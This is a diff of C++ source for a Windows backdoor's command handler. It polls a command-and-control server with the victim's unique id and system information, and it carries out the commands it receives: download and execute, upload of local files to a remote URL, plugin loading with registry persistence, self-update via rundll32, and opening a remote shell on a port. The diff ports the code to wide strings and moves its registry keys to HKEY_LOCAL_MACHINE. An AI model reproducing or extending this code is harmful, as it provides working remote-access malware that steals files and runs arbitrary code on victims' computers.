@@ -5,7 +5,6 @@
 
 #include <cstdio>
 #include <string>
-#include <tchar.h>
 
 #include "print.h"
 #include "info.h"
@@ -91,17 +90,16 @@ bool CommandManager::executeCommands(LPSTR *commands){
 		return false;
 	}
 	Register reg;
-	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
-	TCHAR* key = TEXT("lastc");
-	m_lastcommand = reg.getKeyAsInt(path, key, 0);
+	wchar_t* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
+	wchar_t* key = TEXT("lastc");
+	m_lastcommand = reg.getKeyAsInt(HKEY_LOCAL_MACHINE, path,  key, 0);
 
 	int i = 0;	
 	while(isToken(i, commands)){
-		std::string command = getNextToken(i, commands);
+		std::wstring command = getNextToken(i, commands);
 
 		if (i == 1){
-			char * pEnd;
-			long value = strtol (command.c_str(), &pEnd, 10);
+			long value = std::stol(command);
 			if (value == 0){
 				return false;
 			}
@@ -109,101 +107,99 @@ bool CommandManager::executeCommands(LPSTR *commands){
 				return true;
 			}
 			m_lastcommand = value;
-			reg.createStringKey(HKEY_CURRENT_USER, path, key, command.c_str());
-		} else if (command.compare("end") == 0) {
+			reg.createStringKey(HKEY_LOCAL_MACHINE, path, key, command.c_str());
+		} else if (command.compare(TEXT("end")) == 0) {
 			return true;
-		} else if (command.compare("stop") == 0) {
+		} else if (command.compare(TEXT("stop")) == 0) {
 			stop();
 			return true;
-		} else if (command.compare("download_and_execute") == 0) {
+		} else if (command.compare(TEXT("download_and_execute")) == 0) {
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string url = getNextToken(i, commands);
+			std::wstring url = getNextToken(i, commands);
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string filename = getNextToken(i, commands);
+			std::wstring filename = getNextToken(i, commands);
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string arguments = getNextToken(i, commands);
+			std::wstring arguments = getNextToken(i, commands);
 			downloadAndExecute(url.c_str(), filename.c_str(), arguments.c_str());
-		} else if (command.compare("upload") == 0) {
+		} else if (command.compare(TEXT("upload")) == 0) {
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string url = getNextToken(i, commands);
+			std::wstring url = getNextToken(i, commands);
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string localfile = getNextToken(i, commands);
+			std::wstring localfile = getNextToken(i, commands);
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string remotefile = getNextToken(i, commands);
+			std::wstring remotefile = getNextToken(i, commands);
 			uploadFile(url, localfile, remotefile);
-		} else if (command.compare("plug") == 0) {
+		} else if (command.compare(TEXT("plug")) == 0) {
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string url = getNextToken(i, commands);
+			std::wstring url = getNextToken(i, commands);
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string filename = getNextToken(i, commands);
+			std::wstring filename = getNextToken(i, commands);
 			plug(url.c_str(), filename.c_str());
-		} else if (command.compare("download") == 0) {
+		} else if (command.compare(TEXT("download")) == 0) {
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string url = getNextToken(i, commands);
+			std::wstring url = getNextToken(i, commands);
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string filename = getNextToken(i, commands);
+			std::wstring filename = getNextToken(i, commands);
 			download(url.c_str(), filename.c_str());
-		} else if (command.compare("kill") == 0) {
+		} else if (command.compare(TEXT("kill")) == 0) {
 			kill();
 			return true;
-		} else if (command.compare("update") == 0) {
+		} else if (command.compare(TEXT("update")) == 0) {
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string url = getNextToken(i, commands);
+			std::wstring url = getNextToken(i, commands);
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string filename = getNextToken(i, commands);
+			std::wstring filename = getNextToken(i, commands);
 			update(url.c_str(), filename.c_str());
-		} else if (command.compare("execute") == 0) {
+		} else if (command.compare(TEXT("execute")) == 0) {
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string filename = getNextToken(i, commands);
+			std::wstring filename = getNextToken(i, commands);
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string args = getNextToken(i, commands);
+			std::wstring args = getNextToken(i, commands);
 			execute(filename.c_str(), args.c_str());
-		} else if (command.compare("shell") == 0) {
+		} else if (command.compare(TEXT("shell")) == 0) {
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string port = getNextToken(i, commands);
-			char * pEnd;
-			long value = strtol (port.c_str(), &pEnd, 10);
+			std::wstring port = getNextToken(i, commands);
+			long value = std::stol(port.c_str());
 			if (value == 0){
 				return false;
 			}
 			openShellInNewThread(value);
-		} else if (command.compare("wait") == 0) {
+		} else if (command.compare(TEXT("wait")) == 0) {
 			if (!isToken(i, commands)){
 				return false;
 			}
-			std::string timeout = getNextToken(i, commands);
-			char * pEnd;
-			long value = strtol (timeout.c_str(), &pEnd, 10);
+			std::wstring timeout = getNextToken(i, commands);
+			long value = std::stol(timeout.c_str());
 			if (value == 0){
 				return false;
 			}
@@ -214,29 +210,29 @@ bool CommandManager::executeCommands(LPSTR *commands){
 }
 
 DWORD WINAPI CommandManager::connectToCCLoop(LPVOID args){
-	char buffer[BUFFER_STRING_SIZE];
+	wchar_t buffer[BUFFER_STRING_SIZE];
 	int i = 0;
 
 	CCLoop_t* arguments = (CCLoop_t*)args;
-	const char *filename = arguments->filename;
-	const char *version = arguments->version;
+	const wchar_t *filename = arguments->filename;
+	const wchar_t *version = arguments->version;
 	int wait = arguments->wait;
 
 
 	CommandManager manager;
 	while(Global::get().isRunning()){
-		std::string allInfos = Info::getAllInfos();
+		std::wstring allInfos = Info::getAllInfos();
 		DWORD uid = 123456;
 		if (!Info::getUniqueId(uid)){
 			MYPRINTF("unable to get unique id\n");
 		}
-
-		const char *ccurl = arguments->serversUrl[i].c_str();
-		sprintf_s(buffer, BUFFER_STRING_SIZE, "%s/command.php?v=%s&uid=%u&%s", ccurl, version, uid, allInfos.c_str());
+		std::wstring server = tosW(arguments->serversUrl[i]);
+		const wchar_t *ccurl = server.c_str();
+		swprintf_s(buffer, BUFFER_STRING_SIZE, L"%s/command.php?v=%s&uid=%u&%s", ccurl, version, uid, allInfos.c_str());
 
 
 		HttpHelper httpHelper;
-		MYPRINTF("connect to C&C: %s\n", buffer);
+		MYPRINTF("connect to C&C: %w\n", buffer);
 		LPSTR * commands = httpHelper.get(buffer);
 		if (commands != 0){			
 			if (!manager.executeCommands(commands)){
@@ -269,19 +265,21 @@ bool CommandManager::isToken(int &index, LPSTR *commands){
 	return commands[index] != 0 && isNumeric(commands[index]);
 }
 
-std::string CommandManager::getNextToken(int &index, LPSTR *commands){	
+std::wstring CommandManager::getNextToken(int &index, LPSTR *commands){	
 	Decoder decoder;
-	std::string decoded = decoder.rsaDecode(commands[index]);
-	MYPRINTF("command received: %s\n", decoded.c_str());
+	std::wstring decoded = tosW(decoder.rsaDecode(commands[index]));
+	MYPRINTF("command received: %w\n", decoded.c_str());
 	index++;
 	return decoded;
 }
 
+namespace {
 DWORD WINAPI openShell(LPVOID params){
 	int * value = (int *)params;
 	Shell::openShell(*value);
 	delete value;
 	return 1;
+}
 }
 
 void CommandManager::openShellInNewThread(int port){
@@ -301,17 +299,17 @@ bool CommandManager::isNumeric(LPSTR str){
 	return true;
 }
 
-bool CommandManager::uploadFile(std::string uri, std::string localname, std::string remotename){
+bool CommandManager::uploadFile(std::wstring uri, std::wstring localname, std::wstring remotename){
 	HttpHelper helper;
 	char *response = 0;
 	int responseSize = 0;
 	DWORD uid;
 	if (Info::getUniqueId(uid)){
-		std::string s = std::to_string((_Longlong)uid);	
-		if (uri.find("?") != std::string::npos){
-			uri.append("&uid=").append(s);
+		std::wstring s = std::to_wstring((_Longlong)uid);	
+		if (uri.find(L"?") != std::wstring::npos){
+			uri.append(L"&uid=").append(s);
 		} else {
-			uri.append("?uid=").append(s);
+			uri.append(L"?uid=").append(s);
 		}
 	}
 	bool res = helper.uploadFile(uri.c_str(), localname.c_str(), remotename.c_str(), &response, responseSize);
@@ -320,52 +318,52 @@ bool CommandManager::uploadFile(std::string uri, std::string localname, std::str
 
 }
 
-bool CommandManager::downloadAndExecute(const char *uri, const char *filename, const char *arguments){
+bool CommandManager::downloadAndExecute(const wchar_t *uri, const wchar_t *filename, const wchar_t *arguments){
 	HttpHelper httpHelper;
 	httpHelper.download(uri, filename);
 	Shell::execute(filename, arguments);
 	return true;
 }
 
-bool CommandManager::download(const char *uri, const char *filename){
+bool CommandManager::download(const wchar_t *uri, const wchar_t *filename){
 	HttpHelper httpHelper;
 	httpHelper.download(uri, filename);
 	return true;
 }
 
-bool CommandManager::plug(const char *uri, const char *filename){
+bool CommandManager::plug(const wchar_t *uri, const wchar_t *filename){
 	HttpHelper httpHelper;
 	httpHelper.download(uri, filename);
 
-	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
-	TCHAR* key = TEXT("Plugs");
+	wchar_t* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
+	wchar_t* key = TEXT("Plugs");
 	Register reg;
-	std::string plugs = reg.getKey(path, key);
+	std::wstring plugs = reg.getKey(HKEY_LOCAL_MACHINE, path, key);
 	if (plugs.empty()){
 		plugs = filename;
 	} else {
-		plugs.append(",");
+		plugs.append(TEXT(","));
 		plugs.append(filename);
 			
 	}
-	reg.createStringKey(HKEY_CURRENT_USER, path, key, plugs.c_str());
+	reg.createStringKey(HKEY_LOCAL_MACHINE, path, key, plugs.c_str());
 
 	PluginLoader::getInstance().load(filename);
 	return true;
 }
 
-bool CommandManager::execute(const char *filename, const char *arguments){
+bool CommandManager::execute(const wchar_t *filename, const wchar_t *arguments){
 	Shell::execute(filename, arguments);
 	return true;
 }
 
 
-bool CommandManager::update(const char *uri, const char *filename){
+bool CommandManager::update(const wchar_t *uri, const wchar_t *filename){
 	HttpHelper httpHelper;
 	httpHelper.download(uri, filename);
-	char buffer[128];
-	sprintf_s(buffer, COUNTOF(buffer), " %s InstallService", filename);
-	Shell::execute("rundll32.exe", buffer);
+	wchar_t buffer[128];
+	swprintf_s(buffer, COUNTOF(buffer), L" %s InstallService", filename);
+	Shell::execute(L"rundll32.exe", buffer);
 	return true;
 }
 
